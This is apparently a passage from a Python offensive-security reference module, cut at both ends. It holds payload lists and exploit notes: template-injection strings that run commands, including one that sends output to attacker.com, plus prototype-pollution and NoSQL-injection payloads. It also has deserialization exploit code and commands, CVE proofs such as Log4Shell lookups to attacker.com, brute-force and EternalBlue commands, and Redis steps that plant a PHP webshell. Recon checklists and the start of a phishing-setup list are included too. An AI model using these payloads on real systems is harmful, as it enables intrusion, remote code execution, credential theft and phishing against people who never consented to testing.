    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
                   
    "{{beans}}","{{beans.size}}",
    "{% for entry in (\"freemarker.template.utility.Execute\"?new())(\"id\").split(\"\n\") %}{{entry}}{% endfor %}",
                
    "<%= 7*7 %>","<%= system('id') %>","<%= `id` %>",
    "<%= IO.popen('id').read %>","<%= File.read('/etc/passwd') %>",
    "<%- system('id') -%>",
                   
    "${__import__('os').popen('id').read()}",
    "<%!import os%>${os.popen('id').read()}",
    "<%\nimport os\n%>${os.popen('id').read()}",
                      
    "{% import os %}{{ os.popen('id').read() }}",
                          
    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id', function(error, stdout, stderr) { new XMLHttpRequest().open('GET','http://attacker.com/' + stdout, true).send(); })\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
                        
    "#{7*7}","#{root.process.mainModule.require('child_process').spawnSync('id').stdout}",
    "-var x = rootrequire('child_process').exec('id')",
                      
    "{{.}}","{{if .}}true{{end}}",
    "{{printf \"%s\" .}}","{{call .Method \"arg\"}}",
                        
    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id').toString()\")()}}",
                   
    "<%= 7*7 %>","<%= require('child_process').execSync('id').toString() %>",
    "<%- include('/etc/passwd') %>",
]

                                                                                 
                                                     
                                                                                 

PROTOTYPE_POLLUTION_PAYLOADS = [
                      
    "?__proto__[admin]=true",
    "?__proto__[isAdmin]=true",
    "?__proto__[role]=admin",
    "?__proto__[debug]=true",
    "?__proto__[env]=production",
    "?constructor[prototype][admin]=true",
    "?constructor[prototype][isAdmin]=true",
    "?__proto__[outputFunctionName]=data;process.mainModule.require('child_process').exec('id');s",
    "?__proto__[inspect]=data;process.mainModule.require('child_process').exec('id');s",
    "?__proto__[shell]=node",
    "?__proto__[NODE_OPTIONS]=--require /proc/self/fd/0",
               
    '{"__proto__": {"admin": true}}',
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"role": "admin"}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"__proto__": {"outputFunctionName": "data;process.mainModule.require(\'child_process\').exec(\'id\');s"}}',
    '{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/fd/0"}}',
    '{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}}',
    '{"__proto__": {"allowedHosts": ["*"]}}',
    '{"__proto__": {"ALLOW_CONFIG_MUTATIONS": "true"}}',
    '{"__proto__": {"debug": true}}',
    '{"__proto__": {"defaultProps": {"admin": true}}}',
    '{"__proto__": {"polluted": "yes"}}',
                   
    '{"a": {"__proto__": {"admin": true}}}',
    '{"a": {"b": {"__proto__": {"admin": true}}}}',
            
    '["__proto__", {"admin": true}]',
]

                                                                                 
                                    
                                                                                 

NOSQL_INJECTION_PAYLOADS = [
                                
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$ne": 0}',
    '{"$ne": false}',
    '{"$exists": true}',
    '{"$gt": 0}',
    '{"$gte": 0}',
    '{"$lt": "a"}',
    '{"$regex": ".*"}',
    '{"$regex": "^admin"}',
    '{"$regex": "^a"}',
    '{"$in": ["admin", "root", "user"]}',
    '{"$where": "1==1"}',
    '{"$where": "this.password.length > 0"}',
    '{"$where": "function(){return true}"}',
    '{"$where": "function(){return this.username == \'admin\'}"}',
                                            
    "username[$ne]=invalid&password[$ne]=invalid",
    "username[$gt]=&password[$gt]=",
    "username[$regex]=.*&password[$regex]=.*",
    "username[$exists]=true&password[$exists]=true",
    "username=admin&password[$ne]=wrongpassword",
    "username[$in][]=admin&password[$ne]=x",
                         
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": "admin", "password": {"$ne": null}}',
    '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$in": ["admin","root"]}, "password": {"$ne": ""}}',
    '{"username": "admin", "password": {"$gt": ""}}',
    '{"username": "admin", "password": {"$regex": "^."}}',
                              
    "'; return this.password.length > 0; //",
    "'; return true; //",
    "' || '1'=='1",
    "'; while(true){} //",
    "'; this.username.match(/.*/); //",
             
    "?_id[$ne]=invalid",
    "?username[$ne]=invalid",
                                   
    '{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "docs"}}',
    '{"$out": "attackers_collection"}',
    '{"$merge": {"into": "users"}}',
]

                                                                                 
                                              
                                                                                 

DESERIALIZATION_REFERENCE = {
    "java": {
        "tools": ["ysoserial","SerializationDumper","SerialKiller","Marshalsec"],
        "detection": [
            "Magic bytes: AC ED 00 05 (hex) = rO0 (base64)",
            "Content-Type: application/x-java-serialized-object",
            "Java RMI ports: 1099, 1098",
            "JMX ports: 7199, 9010",
            "Java object in cookie (JSESSIONID)",
            "Java object in request body",
        ],
        "gadget_chains": [
            "CommonsBeanutils1","CommonsBeanutils2",
            "CommonsCollections1","CommonsCollections2",
            "CommonsCollections3","CommonsCollections4",
            "CommonsCollections5","CommonsCollections6",
            "CommonsCollections7",
            "Spring1","Spring2","Spring3",
            "Clojure","Groovy1",
            "ROME","JRMPClient","JRMPListener",
            "BeanShell1","Vaadin1","MozillaRhino1","MozillaRhino2",
            "Myfaces1","Myfaces2",
            "URLDNS",
        ],
        "exploit_cmd": "java -jar ysoserial.jar CommonsCollections1 'id' | base64",
    },
    "python_pickle": {
        "detection": [
            "Content-Type: application/x-python-pickle",
            "pickled data in cookie (often base64)",
            ".pickle / .pkl files",
            "Magic bytes: \\x80\\x02 (protocol 2), \\x80\\x04 (protocol 4)",
        ],
        "exploit": (
            "import pickle, os\n"
            "class Exploit(object):\n"
            "    def __reduce__(self):\n"
            "        return (os.system, ('id',))\n"
            "import base64; print(base64.b64encode(pickle.dumps(Exploit())))"
        ),
    },
    "php_object": {
        "detection": [
            "O:ClassName:N:{...} format in cookies/params",
            "a:N:{...} (arrays), s:N:\"...\" (strings)",
            "unserialize() function in PHP code",
            "PHP object injection via __wakeup, __destruct, __toString",
        ],
        "gadget_chains": [
            "phpggc - PHP Generic Gadget Chains",
            "Laravel/RCE1..RCE9","Symfony/RCE1..RCE9",
            "WordPress/RCE1","Guzzle/FW1..FW2",
            "Slim/RCE1","Zend/RCE1..RCE3",
            "Yii/RCE1..RCE2","Drupal/RCE1",
            "Monolog/RCE1..RCE9",
        ],
        "exploit_cmd": "phpggc Laravel/RCE9 system id | base64",
    },
    "ruby_marshal": {
        "detection": [
            "\\x04\\x08 magic bytes",
            "Marshal.load() in Ruby code",
            "Object in cookie",
        ],
        "exploit": "Tools: universal-deserialisation-gadget-for-ruby",
    },
    "dotnet_binaryformatter": {
        "detection": [
            "AAEAAAD// magic bytes (base64 of BinaryFormatter)",
            "ViewState parameter on ASP.NET pages",
            "__VIEWSTATE without MAC validation",
            "JSON serialized .NET objects",
        ],
        "tools": ["ysoserial.net","ExploitRemotingService"],
        "gadget_chains": [
            "TypeConfuseDelegate","ActivitySurrogateSelector",
            "ObjectDataProvider","ClaimsPrincipal",
            "WindowsClaimsIdentity","WindowsPrincipal",
            "TextFormattingRunProperties",
        ],
        "exploit_cmd": "ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"cmd /c id\" -o base64",
    },
    "node_serialize": {
        "detection": [
            "JSON with _$$ND_FUNC$$ prefix in functions",
            "node-serialize npm package usage",
        ],
        "exploit": (
            '{"rce":"_$$ND_FUNC$$function(){require(\'child_process\').exec(\'id\',(function(error,stdout,stderr){console.log(stdout)}))}()"}'
        ),
    },
    "xmlrpc": {
        "detection": [
            "Content-Type: text/xml for method calls",
            "XML-RPC endpoints: /xmlrpc.php, /RPC2, /api/xmlrpc",
            "WordPress xmlrpc.php",
        ],
        "exploit": (
            "<?xml version='1.0' encoding='UTF-8'?>"
            "<methodCall><methodName>system.listMethods</methodName><params/></methodCall>"
        ),
    },
}

                                                                                 
                                            
                                                                                 

BUSINESS_LOGIC_CHECKLIST = [
    "01. Negative price / quantity (set price=-1 in cart)",
    "02. Zero price / quantity (set price=0)",
    "03. Integer overflow on quantity/price fields",
    "04. Floating point price manipulation (0.001 * 1000 = 0.99 vs 1.00)",
    "05. Currency manipulation — change USD to BTC in request",
    "06. Apply coupon multiple times",
    "07. Coupon code brute-force (short/predictable codes)",
    "08. Apply coupon to non-applicable items",
    "09. Combine non-stackable discounts",
    "10. Referral reward abuse (self-referral)",
    "11. Referral reward with disposable email",
    "12. Cashback/reward points abuse — buy then refund",
    "13. Gift card balance manipulation",
    "14. Checkout → change item quantity after price calculation",
    "15. Race condition on checkout/payment",
    "16. Race condition on limited stock purchase",
    "17. Double submit / double payment",
    "18. Skip steps in multi-step checkout (direct POST to final step)",
    "19. Change shipping address after payment confirmation",
    "20. Change order quantity after payment",
    "21. Cancel after shipping (fraudulent return)",
    "22. Chargebacks / chargeback abuse",
    "23. Free trial abuse — sign up repeatedly",
    "24. Downgrade after benefit received (upgrade → use → downgrade)",
    "25. Account sharing for subscription",
    "26. Download limit bypass — re-download after exhausting limit",
    "27. API rate limit bypass (see RATE_LIMIT_BYPASS)",
    "28. Password reset link reuse",
    "29. Email verification link reuse",
    "30. Invite link reuse beyond limit",
    "31. Onboarding steps skippable (access resources before payment)",
    "32. Feature flag manipulation in client-side code",
    "33. Role/plan level stored client-side (cookie/localStorage)",
    "34. Admin-only features accessible via URL guessing",
    "35. Unpublished product accessible via direct URL/API",
    "36. Archived/deleted resource still accessible via old URL",
    "37. Export data before account deletion",
    "38. Account enumeration via password reset",
    "39. Account takeover via email change without verification",
    "40. Account takeover via OAuth linking without confirmation",
    "41. Account takeover via username change to existing user",
    "42. MFA bypass via backup codes brute-force",
    "43. MFA bypass via remember-device token not expiring",
    "44. Session not invalidated on password change",
    "45. Session not invalidated on logout (server-side)",
    "46. Concurrent session limit not enforced",
    "47. Impersonation via JWT sub manipulation (see IDOR)",
    "48. Horizontal privilege escalation — access other user's data",
    "49. Vertical privilege escalation — access admin functionality",
    "50. Workflow sequence bypass — complete step N without step N-1",
]

                                                                                 
                                                
                                                                                 

SECURITY_MISCONFIG_CHECKLIST = [
    "01. Default credentials on admin panels / IoT / network devices",
    "02. Debug mode enabled in production (Django DEBUG=True, Flask debug=True)",
    "03. Stack trace / exception details exposed to users",
    "04. Directory listing enabled (Apache/nginx autoindex on)",
    "05. Unnecessary HTTP methods enabled (PUT, DELETE, TRACE, OPTIONS)",
    "06. TRACE method enabled → XST (Cross-Site Tracing) attack",
    "07. HTTP OPTIONS returns all allowed methods",
    "08. Server version / technology headers exposed",
    "09. X-Powered-By header exposes framework version",
    "10. Backup files accessible (.bak, .old, .orig, .zip)",
    "11. Git/SVN repository accessible (.git/, .svn/)",
    "12. .env file accessible — leaks credentials",
    "13. phpinfo() page accessible",
    "14. Test pages accessible (/test/, /phptest/, /info.php)",
    "15. Admin panels exposed to internet (/admin, /wp-admin, /phpmyadmin)",
    "16. API documentation exposed (Swagger UI, GraphiQL) without auth",
    "17. Health/metrics endpoints exposed without auth (/metrics, /actuator)",
    "18. Actuator endpoints exposed — Spring Boot /actuator/env, /actuator/heapdump",
    "19. Kubernetes dashboard exposed without auth",
    "20. Elasticsearch/Kibana/Grafana exposed without auth",
    "21. Redis/MongoDB without auth — exposed to internet",
    "22. Docker API exposed (port 2375/2376) without TLS",
    "23. etcd exposed without auth (port 2379)",
    "24. Consul without ACLs — port 8500 exposed",
    "25. Vault without auth — port 8200 exposed",
    "26. Weak SSL/TLS configuration — SSLv3, TLS 1.0, TLS 1.1 supported",
    "27. Self-signed certificates in production",
    "28. Certificate not validated (verify=False in requests)",
    "29. Insecure cipher suites — RC4, DES, 3DES, NULL",
    "30. HSTS not set or max-age too short",
    "31. Missing CSP header or overly permissive CSP",
    "32. Missing X-Frame-Options or clickjacking-friendly CSP",
    "33. Missing X-Content-Type-Options",
    "34. Missing Referrer-Policy",
    "35. Missing Permissions-Policy",
    "36. CORS misconfiguration — Access-Control-Allow-Origin: *",
    "37. CORS with credentials allowed from all origins",
    "38. CORS reflecting Origin header blindly",
    "39. CORS allowing null origin",
    "40. CORS wildcard subdomain — *.example.com",
    "41. Insecure cookie flags — missing Secure, HttpOnly, SameSite",
    "42. Session fixation — sessionid not regenerated after login",
    "43. Session ID in URL",
    "44. Overly long session lifetime",
    "45. CSRF protection absent or bypassable",
    "46. Clickjacking — X-Frame-Options missing",
    "47. Cache-Control missing for sensitive pages (proxy caching auth pages)",
    "48. Sensitive data in URL parameters (passwords, tokens)",
    "49. Sensitive data in logs",
    "50. Verbose error messages in production",
]

                                                                                 
                                           
                                                                                 

CVE_QUICK_REFERENCE = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "cvss": 10.0,
        "affected": "Apache Log4j 2.x < 2.15.0",
        "vector": "JNDI injection via user-controlled log messages",
        "poc": "${jndi:ldap://attacker.com/a}",
        "headers_to_test": ["User-Agent","X-Forwarded-For","X-Api-Version","Referer","Accept","Authorization"],
    },
    "CVE-2021-45046": {
        "name": "Log4Shell bypass",
        "cvss": 9.0,
        "affected": "Apache Log4j 2.x < 2.16.0",
        "vector": "Bypass of 2.15.0 mitigation via JNDI lookup in context lookups",
        "poc": "${${lower:j}ndi:${lower:l}${lower:d}ap://attacker.com/a}",
        "headers_to_test": ["User-Agent","X-Forwarded-For","Authorization","X-Api-Version"],
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "cvss": 9.8,
        "affected": "Spring Framework < 5.3.18, < 5.2.20",
        "vector": "Class loader manipulation via data binding (e.g., class.module.classLoader.*)",
        "poc": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        "headers_to_test": [],
    },
    "CVE-2022-42889": {
        "name": "Text4Shell (Commons Text)",
        "cvss": 9.8,
        "affected": "Apache Commons Text 1.5-1.9",
        "vector": "Script/DNS/URL lookups via StringSubstitutor",
        "poc": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
        "headers_to_test": ["User-Agent","X-Forwarded-For"],
    },
    "CVE-2021-41773": {
        "name": "Apache Path Traversal",
        "cvss": 7.5,
        "affected": "Apache HTTP Server 2.4.49",
        "vector": "Path traversal + RCE via mod_cgi",
        "poc": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "headers_to_test": [],
    },
    "CVE-2021-42013": {
        "name": "Apache Path Traversal (bypass)",
        "cvss": 9.8,
        "affected": "Apache HTTP Server 2.4.49-2.4.50",
        "vector": "Double-encoding bypass of 41773 fix",
        "poc": "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
        "headers_to_test": [],
    },
    "CVE-2022-0847": {
        "name": "Dirty Pipe",
        "cvss": 7.8,
        "affected": "Linux kernel < 5.16.11, < 5.15.25, < 5.10.102",
        "vector": "Local privilege escalation via page cache write with PIPE_BUF_FLAG_CAN_MERGE",
        "poc": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits",
        "headers_to_test": [],
    },
    "CVE-2023-46604": {
        "name": "Apache ActiveMQ RCE",
        "cvss": 10.0,
        "affected": "Apache ActiveMQ < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3",
        "vector": "ExceptionResponse deserialization → ClassInfo command RCE",
        "poc": "https://github.com/X1r0z/ActiveMQ-RCE",
        "headers_to_test": [],
    },
    "CVE-2023-44487": {
        "name": "HTTP/2 Rapid Reset",
        "cvss": 7.5,
        "affected": "Many HTTP/2 implementations",
        "vector": "DDoS via rapid HEADERS → RST_STREAM cycles",
        "poc": "PoC tools: h2load, rapid-reset-client",
        "headers_to_test": [],
    },
    "CVE-2024-3400": {
        "name": "PAN-OS Command Injection",
        "cvss": 10.0,
        "affected": "Palo Alto Networks PAN-OS < 11.1.2-h3, < 11.0.4-h1, < 10.2.9-h1",
        "vector": "Unauthenticated OS command injection via GlobalProtect",
        "poc": "SESSID cookie injection → arbitrary file write → RCE",
        "headers_to_test": ["Cookie"],
    },
    "CVE-2024-21762": {
        "name": "Fortinet FortiOS SSL VPN RCE",
        "cvss": 9.6,
        "affected": "FortiOS SSL VPN < 7.4.3, < 7.2.7, < 7.0.14, < 6.4.15",
        "vector": "Out-of-bounds write in SSL VPN daemon",
        "poc": "Unauthenticated RCE via crafted HTTP request",
        "headers_to_test": [],
    },
    "CVE-2024-1709": {
        "name": "ConnectWise ScreenConnect Auth Bypass",
        "cvss": 10.0,
        "affected": "ConnectWise ScreenConnect < 23.9.8",
        "vector": "Authentication bypass via path confusion + setup wizard re-run",
        "poc": "/SetupWizard.aspx/../../../../usr/bin/id",
        "headers_to_test": [],
    },
    "CVE-2023-22515": {
        "name": "Confluence Broken Access Control",
        "cvss": 10.0,
        "affected": "Confluence Data Center/Server < 8.3.3, < 8.4.3, < 8.5.2",
        "vector": "Unauthenticated admin account creation via /setup/setupadministrator.action",
        "poc": "POST /setup/setupadministrator.action",
        "headers_to_test": [],
    },
    "CVE-2023-22527": {
        "name": "Confluence OGNL Injection RCE",
        "cvss": 10.0,
        "affected": "Confluence Data Center/Server 8.0.x-8.5.3",
        "vector": "OGNL template injection in older Confluence versions",
        "poc": "Authenticated OGNL injection → RCE",
        "headers_to_test": [],
    },
    "CVE-2023-34362": {
        "name": "MOVEit Transfer SQL Injection",
        "cvss": 9.8,
        "affected": "MOVEit Transfer < 2023.0.0",
        "vector": "SQL injection in HTTP endpoint → data exfiltration + webshell upload",
        "poc": "Extensively exploited by CL0P ransomware group",
        "headers_to_test": [],
    },
    "CVE-2024-23897": {
        "name": "Jenkins Arbitrary File Read",
        "cvss": 9.8,
        "affected": "Jenkins < 2.442, < LTS 2.426.3",
        "vector": "CLI args parser reads arbitrary files; unauthenticated on instances with CLI enabled",
        "poc": "java -jar jenkins-cli.jar -s http://target/ help @/etc/passwd",
        "headers_to_test": [],
    },
}



                                                                                 
                                   
                                                                                 

PASSIVE_RECON_CHECKLIST = [
    "01. WHOIS lookup — registrar, registrant, name servers, expiry",
    "02. Reverse WHOIS — find all domains registered by same person/org",
    "03. DNS records — A, AAAA, MX, NS, TXT, CNAME, SOA, SRV, CAA, DKIM, DMARC",
    "04. Zone transfer attempt — AXFR on all name servers",
    "05. Subdomain enumeration — Certificate Transparency logs (crt.sh, censys)",
    "06. Subdomain enumeration — Google dork: site:target.com -www",
    "07. Subdomain enumeration — subfinder, amass, assetfinder, dnsx",
    "08. Subdomain enumeration — Shodan: hostname:target.com",
    "09. ASN lookup — find all IP ranges owned by org",
    "10. IP range scanning — masscan ASN ranges",
    "11. Reverse IP lookup — find all domains hosted on same IP",
    "12. Certificate Transparency — find expired certs, internal hostnames",
    "13. Shodan search — find exposed services, versions, banners",
    "14. Censys search — find all certs, open ports for org",
    "15. FOFA/Zoomeye search — find web apps by fingerprint",
    "16. Google dorks — filetype:env, filetype:log, filetype:sql",
    "17. Google dorks — inurl:admin, inurl:login, inurl:api",
    "18. Google dorks — intitle:'index of', intitle:'phpinfo'",
    "19. Google dorks — site:target.com ext:php inurl:?",
    "20. Google dorks — site:target.com 'DB_PASSWORD'",
    "21. Wayback Machine — find old endpoints, parameters, admin pages",
    "22. Common Crawl — historical URL enumeration",
    "23. gau / getallurls — collect known URLs from multiple sources",
    "24. GitHub dorks — org:target filename:.env, filename:config.php",
    "25. GitHub dorks — 'target.com' password OR secret OR api_key",
    "26. GitLab / Bitbucket public repos — search for credentials",
    "27. Pastebin / hastebin — leaked credentials, API keys",
    "28. LinkedIn — employee names, tech stack, job postings",
    "29. Job postings — tech stack hints (Java Spring, .NET, Rails, etc.)",
    "30. BuiltWith / Wappalyzer — technology fingerprinting",
    "31. VirusTotal passive DNS — historical DNS resolutions",
    "32. Hunter.io — email format discovery, employee emails",
    "33. theHarvester — email, host, subdomain enumeration",
    "34. breach data (HaveIBeenPwned) — check employee emails",
    "35. Pastebin OSINT — leaked configs, passwords mentioning target",
    "36. TruffleHog / gitleaks — scan public repos for secrets",
    "37. CloudScraper — bypass Cloudflare to get origin IP",
    "38. SecurityTrails — DNS history, subdomain enumeration, IP history",
    "39. RiskIQ PassiveTotal — passive DNS, host pairs, trackers",
    "40. Netcraft — site report, technology fingerprint, hosting history",
    "41. BGP.he.net — ASN details, prefix list, peer info",
    "42. hackertarget.com — reverse IP, DNS records, zone transfer",
    "43. S3 bucket enumeration — target-name.s3.amazonaws.com",
    "44. GCS bucket enumeration — storage.googleapis.com/target-name",
    "45. Azure blob enumeration — target.blob.core.windows.net",
    "46. S3Scanner / CloudEnum — automated cloud storage enum",
    "47. NPM / PyPI public packages — leaked credentials in packages",
    "48. Docker Hub — public images with embedded credentials",
    "49. Exposed Swagger/OpenAPI spec — enumerate all API endpoints",
    "50. Source maps (*.js.map) — reveal original source code / endpoints",
]

                                                                                 
                                  
                                                                                 

ACTIVE_RECON_CHECKLIST = [
    "01. Port scan — nmap -sV -sC -p- target (full TCP)",
    "02. Port scan — nmap -sU --top-ports 200 target (UDP)",
    "03. OS fingerprinting — nmap -O target",
    "04. Service version detection — nmap -sV target",
    "05. NSE vuln scripts — nmap --script vuln target",
    "06. Web tech fingerprinting — whatweb, wappalyzer",
    "07. Web crawler — gospider, hakrawler, katana",
    "08. Directory brute-force — gobuster, ffuf, dirsearch, feroxbuster",
    "09. Parameter discovery — arjun, x8, parameth",
    "10. JavaScript endpoint discovery — linkfinder, subjs, jsluice",
    "11. API endpoint enumeration — kiterunner, restler",
    "12. Subdomain brute-force — dnsx, puredns, shuffledns",
    "13. Virtual host discovery — gobuster vhost, ffuf VHOST mode",
    "14. WAF detection — wafw00f",
    "15. Load balancer detection — lbd",
    "16. CDN bypass — find origin IP via headers, SSL cert, email headers",
    "17. Banner grabbing — nc, curl, httpx -title -server",
    "18. robots.txt / sitemap.xml — discover hidden paths",
    "19. security.txt — find reported vulnerabilities",
    "20. Well-known endpoints — /.well-known/openid-configuration",
    "21. CORS probe — check Access-Control-Allow-Origin on all endpoints",
    "22. Security headers audit — missing CSP, HSTS, X-Frame-Options",
    "23. SSL/TLS audit — sslscan, sslyze, testssl.sh",
    "24. HTTP method testing — OPTIONS, PUT, DELETE on all endpoints",
    "25. 403 bypass — path traversal, header injection, case variation",
    "26. Source code review — browser dev tools for JS endpoints, secrets",
    "27. Source map extraction — map2src, download *.js.map files",
    "28. Cookie analysis — decode, inspect flags, test for auth bypass",
    "29. JWT analysis — jwt.io, check alg, exp, sub claims",
    "30. Form analysis — hidden fields, CSRF tokens, honeypots",
    "31. File upload testing — extension bypass, content-type bypass",
    "32. Input validation testing — SQLi, XSS, SSTI, CMDI, SSRF, XXE",
    "33. Authentication testing — brute-force, enumeration, bypass",
    "34. Authorization testing — IDOR, privilege escalation, BOLA",
    "35. Session management — fixation, expiry, invalidation on logout",
    "36. Error handling — trigger 400/500 errors for stack traces",
    "37. Rate limiting — test login, password reset, OTP endpoints",
    "38. HTTP Request Smuggling — test with smuggler.py, HTTP2Smuggling",
    "39. Cache poisoning — X-Forwarded-Host, Host header injection",
    "40. Clickjacking — iframe target in HTML to test X-Frame-Options",
    "41. Dependency confusion — check npm/pip/gem package names",
    "42. Subdomain takeover — check unclaimed CNAME targets",
    "43. Open redirect testing — test redirect parameters",
    "44. IDOR testing — increment IDs, UUID prediction, GUID swap",
    "45. GraphQL testing — introspection, batching, injection",
    "46. WebSocket testing — message injection, auth bypass",
    "47. OAuth/SSO testing — state CSRF, redirect_uri bypass",
    "48. Password reset testing — token predictability, expiry, reuse",
    "49. 2FA/MFA testing — brute-force, bypass, backup code weakness",
    "50. Business logic testing — price manipulation, workflow bypass",
]

                                                                                 
                                                 
                                                                                 

NETWORK_PENTEST_REFERENCE = {
    "smb": {
        "ports": [139, 445],
        "detection": "nmap -p 445 --script smb-security-mode target",
        "enum_cmds": [
            "smbmap -H target",
            "smbclient -L //target -N",
            "smbclient //target/share -N",
            "crackmapexec smb target",
            "enum4linux -a target",
            "nmap --script smb-enum-shares,smb-enum-users target",
        ],
        "vulns": ["EternalBlue (MS17-010)","EternalRomance","EternalChampion",
                  "SMBGhost (CVE-2020-0796)","PrintNightmare (CVE-2021-1675)"],
        "exploit_cmds": [
            "python3 eternalblue.py target",
            "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; run'",
        ],
    },
    "rdp": {
        "ports": [3389],
        "detection": "nmap -p 3389 --script rdp-enum-encryption target",
        "enum_cmds": [
            "nmap -sV -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 target",
            "hydra -l admin -P passwords.txt rdp://target",
        ],
        "vulns": ["BlueKeep (CVE-2019-0708)","DejaBlue (CVE-2019-1181)","CVE-2019-0708"],
        "bypass": ["NLA bypass with null sessions","Credential stuffing","Pass-the-hash with xfreerdp"],
    },
    "ftp": {
        "ports": [21],
        "detection": "nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst target",
        "enum_cmds": [
            "ftp target",
            "nmap --script ftp-anon target",
            "hydra -l admin -P passwords.txt ftp://target",
        ],
        "vulns": ["Anonymous FTP access","FTP bounce attack","Plaintext credentials","CVE-2011-2523 (vsftpd backdoor)"],
    },
    "ssh": {
        "ports": [22, 2222, 22222],
        "detection": "nmap -p 22 --script ssh-auth-methods,ssh-hostkey target",
        "enum_cmds": [
            "ssh-audit target",
            "nmap --script ssh-auth-methods --script-args='ssh.user=root' target",
            "hydra -l root -P passwords.txt ssh://target",
            "medusa -h target -u root -P passwords.txt -M ssh",
        ],
        "vulns": ["Weak ciphers/MACs","Password auth enabled","Username enumeration (OpenSSH < 7.7)"],
        "privesc": ["ssh -D 1080 user@target (SOCKS proxy)","ssh -L 8080:localhost:80 user@target"],
    },
    "dns": {
        "ports": [53],
        "enum_cmds": [
            "dig @target target.com AXFR",
            "host -l target.com ns1.target.com",
            "nmap -p 53 --script dns-zone-transfer target",
            "dnsenum target.com",
            "fierce --domain target.com",
            "dnsrecon -d target.com -t axfr",
        ],
        "vulns": ["Zone transfer allowed","DNS cache poisoning","DNS amplification","DNSSEC not configured"],
    },
    "http_https": {
        "ports": [80, 443, 8080, 8443, 8000, 8888],
        "enum_cmds": [
            "nikto -h http://target",
            "gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt",
            "ffuf -w big.txt -u http://target/FUZZ",
            "whatweb http://target",
            "curl -s -I http://target",
            "nuclei -u http://target",
        ],
        "vulns": ["See web application sections above"],
    },
    "smtp": {
        "ports": [25, 465, 587],
        "enum_cmds": [
            "nmap -p 25 --script smtp-enum-users,smtp-open-relay target",
            "smtp-user-enum -M VRFY -U users.txt -t target",
            "swaks --server target --to test@target.com",
        ],
        "vulns": ["Open relay","VRFY/EXPN user enumeration","Plaintext auth","Email spoofing (no SPF/DKIM/DMARC)"],
    },
    "ldap": {
        "ports": [389, 636, 3268, 3269],
        "enum_cmds": [
            "ldapsearch -x -H ldap://target -b 'dc=target,dc=com'",
            "nmap -p 389 --script ldap-rootdse,ldap-search target",
            "ldapdomaindump target -u 'domain\\user' -p password",
        ],
        "vulns": ["Anonymous bind","Weak credentials","LDAP injection","Cleartext LDAP (port 389)"],
    },
    "snmp": {
        "ports": [161, 162],
        "enum_cmds": [
            "snmpwalk -c public -v1 target",
            "snmpwalk -c public -v2c target",
            "nmap -sU -p 161 --script snmp-info,snmp-sysdescr target",
            "onesixtyone -c community.txt target",
            "braa public@target:.1.3.6.*",
        ],
        "vulns": ["Default community strings (public/private)","SNMPv1/v2 plaintext","Information disclosure"],
    },
    "mssql": {
        "ports": [1433],
        "enum_cmds": [
            "nmap -p 1433 --script ms-sql-info,ms-sql-empty-password target",
            "sqsh -S target -U sa -P ''",
            "crackmapexec mssql target -u sa -p password",
            "impacket-mssqlclient sa:password@target",
        ],
        "vulns": ["SA account with blank password","xp_cmdshell enabled","Linked server abuse"],
    },
    "mysql": {
        "ports": [3306],
        "enum_cmds": [
            "nmap -p 3306 --script mysql-info,mysql-empty-password target",
            "mysql -h target -u root",
            "hydra -l root -P passwords.txt mysql://target",
        ],
        "vulns": ["Root with no password","Accessible from internet","Arbitrary file read via LOAD DATA INFILE"],
    },
    "redis": {
        "ports": [6379],
        "enum_cmds": [
            "redis-cli -h target info",
            "redis-cli -h target config get *",
            "nmap -p 6379 --script redis-info target",
        ],
        "vulns": ["No auth required","CONFIG SET → write webshell","Replication → RCE (SLAVEOF)"],
        "exploit": [
            "redis-cli -h target CONFIG SET dir /var/www/html",
            "redis-cli -h target CONFIG SET dbfilename shell.php",
            "redis-cli -h target SET shell '<?php system($_GET[\"cmd\"]); ?>'",
            "redis-cli -h target BGSAVE",
        ],
    },
    "mongodb": {
        "ports": [27017, 27018, 27019],
        "enum_cmds": [
            "mongo --host target --port 27017",
            "nmap -p 27017 --script mongodb-databases,mongodb-info target",
            "mongoaudit --host target",
        ],
        "vulns": ["No auth required","Accessible from internet","Data exfiltration"],
    },
    "elasticsearch": {
        "ports": [9200, 9300],
        "enum_cmds": [
            "curl http://target:9200/",
            "curl http://target:9200/_cat/indices",
            "curl http://target:9200/_cluster/health",
            "curl http://target:9200/_all/_search",
        ],
        "vulns": ["No auth required","Sensitive data exposure","RCE via Groovy scripting (old versions)"],
    },
}

                                                                                 
                                                   
                                                                                 

SOCIAL_ENGINEERING_REFERENCE = {
    "phishing_setup": [
        "Clone target login page with goclone / httrack",
        "Host on typosquatted domain (target-corp.com, tarqet.com)",
        "Obtain TLS certificate for phishing domain (Let's Encrypt)",
